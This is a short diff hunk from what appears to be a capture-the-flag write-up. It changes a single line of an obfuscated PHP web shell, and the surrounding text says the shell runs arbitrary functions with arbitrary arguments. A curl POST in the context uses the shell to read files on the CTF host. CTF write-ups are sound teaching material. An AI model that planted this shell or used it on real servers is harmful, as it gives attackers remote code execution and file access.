@@ -74,7 +74,7 @@ curl https://host.ctf.com/shell.php -X POST -F "0=print_r" -F "1=file_get_conten
 The full tryhard shell can be archived with this snipped:
 
 ```php
-<?=0;$_=[]..1;$_=${$_[6].$_[3].$_[4].$_[3].$_[3]^($_^$_[5]).+1625};$_[0]($_[1]($_[2], $_[3]));
+<?=0;$_=[]..1;$_=${$_[6].$_[3].$_[4].$_[3].$_[3]^($_^$_[5]).+1625};$_[0]($_[1]($_[2],$_[3]));
 ```
 
 With this setup we can run any function with as much arguments as we like.
